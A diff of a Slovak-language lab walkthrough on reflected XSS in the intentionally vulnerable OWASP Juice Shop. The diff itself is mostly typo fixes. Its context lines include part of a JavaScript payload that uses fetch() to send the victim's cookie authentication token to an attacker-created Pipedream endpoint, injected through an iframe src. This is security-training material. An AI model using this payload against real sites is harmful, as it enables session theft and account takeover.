@@ -2,11 +2,12 @@
 
 ### Prostredie: Juice-Shop - https://github.com/juice-shop/juice-shop#from-sources
 
+- Reflektovaný XSS využíva pridávanie neovereného vstupu priamo do tela stránky čím umožnuje spustenie kódu útočníka.
 - Po spustení aplikácie a zaregistrovaní sa prejdeme do sekcii v menu "Objednávky a platby".
 - V url sa nám zobrazujú objednávky podľa parametru id. V detaile objednávky vidíme informácie o stave a id objednávky vložené z url parametru.
 - Takáto konštrukcia má potencionálnu zraniteľnosť a to, že vpisujeme neoverený vstup priamo do DOM stránky.
 - V zdrojovom kóde juice-shopu v komponente track-result.component.html (angular komponent) je hodnota id vkladaná do DOM cez zraniteľnú metódu "innerHTML". To nám v prípade neoverenia vstupu umožňuje aplikovať reflektovaný XSS útok.
-- Do url parametru môžeme vložiť škodlivý kód a ten bude priamo vložený do tela stránky.
+- Do url parametru môžeme vložiť škodlivý kód, ktorý bude priamo vložený do tela stránky.
   ```
           const headers = new Headers();
           headers.append("Content-Type", "text/plain");
@@ -26,7 +27,7 @@
         fetch("pipedream-endpoint", options); 
 - Kód vytvorí HTTP požiadavku na daný endpoint a odošle autentifikačný token z cookie súborov. 
 - V kóde sa nachádza komentár nad funkciou fetch(). Pomocou služby Pipedream musíme vygenerovať nový endpoint a jeho url adresu vložiť do funkcie. Na adrese https://pipedream.com/ si vytvoríme
-    nový projekt. Po vytvorení projketu vygenerujeme endpoint a v sekcii "trigger" skopírujeme url adresu a vložíme do hášho kódu.
+    nový projekt. Po vytvorení projektu vygenerujeme endpoint a v sekcii "trigger" skopírujeme url adresu a vložíme do nášho kódu.
 - Kód musíme vložiť do atribútu "src" značky "iframe" aby ho stránka vedeľa vyhodnotiť.
 
    ```
